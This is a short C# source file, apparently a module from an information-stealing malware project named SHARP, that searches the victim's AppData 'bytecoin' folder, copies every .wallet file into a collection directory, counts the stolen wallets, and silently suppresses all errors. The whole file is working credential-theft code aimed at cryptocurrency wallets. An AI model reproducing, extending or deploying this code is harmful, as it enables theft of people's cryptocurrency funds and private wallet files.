using System.IO;

namespace SHARP
{
    internal class Bytecoin
    {
      public static void BCNcoinStr(string directorypath)
      {
        try
        {
          foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\bytecoin").GetFiles())
          {
            Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
            if (file.Extension.Equals(".wallet"))
              file.CopyTo($"{directorypath}\\Bytecoin\\{file.Name}");
          }
          ++Counting.bytecoin;
          ++Counting.Wallets;
        }
        catch
        {
        }
      }
    }
}
